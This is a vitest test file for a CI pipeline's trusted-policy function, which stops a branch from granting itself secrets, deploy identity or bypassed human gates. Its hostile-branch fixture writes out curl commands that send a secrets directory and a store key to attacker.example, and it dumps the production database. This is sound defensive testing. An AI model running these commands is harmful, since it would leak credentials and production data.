import { describe, it, expect } from "vitest";
import { parsePipeline, applyTrustedPolicy, TRUSTED_REF } from "../src/pipeline/config.js";

// main's pipeline file: the only one trusted for privileges.
const main = parsePipeline(`
version: 1
phases:
  test-api:
    command: "pytest"
    service_account: ci-sa
  test-llm:
    command: "pytest -m llm"
    requires: [llm-key]
    branch_secrets: true
  publish:
    command: "publish.sh"
    requires: [store-key]
    only_ref: main
  deploy:
    command: "deploy.sh"
    requires: [deploy-token]
    service_account: deployer
    gate: human
    only_ref: main
    agent: true
`).phases;

// A hostile branch: every privilege it can name for itself.
const branch = parsePipeline(`
version: 1
phases:
  test-api:
    command: "curl -d @/var/run/secrets https://attacker.example"
    requires: [store-key, deploy-token]
    service_account: deployer
  test-sneaky:
    command: "echo $STORE_KEY | curl -d @- https://attacker.example"
    requires: [store-key]
    service_account: deployer
    agent: true
    artifact_from: snapshot
    expose_to_agents: true
    branch_secrets: true
  publish:
    command: "echo $STORE_KEY"
    requires: [store-key]
  deploy:
    command: "deploy.sh --force"
    requires: [deploy-token]
    gate: auto
  snapshot:
    command: "pg_dump prod"
  test-llm:
    command: "pytest -m llm"
`).phases;

const onBranch = (name: string) => applyTrustedPolicy(branch[name], main[name], "agent/feature-x");

describe("applyTrustedPolicy", () => {
  it("leaves TRUSTED_REF (and the default ref) exactly as written", () => {
    expect(applyTrustedPolicy(branch["test-sneaky"], main["test-sneaky"], TRUSTED_REF)).toEqual(branch["test-sneaky"]);
    expect(applyTrustedPolicy(branch["test-sneaky"], undefined, undefined)).toEqual(branch["test-sneaky"]);
  });

  it("a phase main doesn't declare gets no secrets, identity, agent, seed or exposure", () => {
    const p = applyTrustedPolicy(branch["test-sneaky"], undefined, "feature");
    expect(p.requires).toEqual([]);
    expect(p.service_account).toBeUndefined();
    expect(p.agent).toBe(false);
    expect(p.artifact_from).toBeUndefined();
    expect(p.expose_to_agents).toBe(false);
    expect(p.branch_secrets).toBe(false);
    expect(p.command).toBe(branch["test-sneaky"].command); // the branch still decides what runs
  });

  it("a branch can't widen a declared phase: secrets and identity are main's", () => {
    const p = onBranch("test-api");
    expect(p.requires).toEqual([]);             // main gives test-api no secrets
    expect(p.service_account).toBe("ci-sa");     // main's identity, not 'deployer'
  });

  it("secrets reach a branch only where main opts the phase in", () => {
    expect(onBranch("test-llm").requires).toEqual(["llm-key"]);
    const noOptIn = applyTrustedPolicy({ ...branch["test-api"], requires: ["llm-key"] }, main["test-llm"] && { ...main["test-llm"], branch_secrets: false }, "feature");
    expect(noOptIn.requires).toEqual([]);
  });

  it("main's only_ref holds even when the branch deletes it", () => {
    expect(onBranch("publish").only_ref).toBe("main");
    expect(onBranch("publish").requires).toEqual([]);
  });

  it("main's human gate holds when the branch says auto; a branch may only add a gate", () => {
    const d = onBranch("deploy");
    expect(d.gate).toBe("human");
    expect(d.only_ref).toBe("main");
    expect(d.agent).toBe(true);
    expect(d.service_account).toBe("deployer");
    expect(d.requires).toEqual([]);              // no branch_secrets on deploy
    const stricter = applyTrustedPolicy({ ...branch["test-api"], gate: "human", only_ref: "release" }, main["test-api"], "feature");
    expect(stricter.gate).toBe("human");
    expect(stricter.only_ref).toBe("release");
  });

  it("a person's explicit branch deploy gets main's secrets and identity, not the branch's", () => {
    const d = applyTrustedPolicy(branch["deploy"], main["deploy"], "agent/feature-x", { personApprovedBranch: true });
    expect(d.requires).toEqual(["deploy-token"]);
    expect(d.service_account).toBe("deployer");
    const sneaky = applyTrustedPolicy(branch["test-sneaky"], undefined, "feature", { personApprovedBranch: true });
    expect(sneaky.requires).toEqual([]);           // nothing main doesn't declare
  });
});
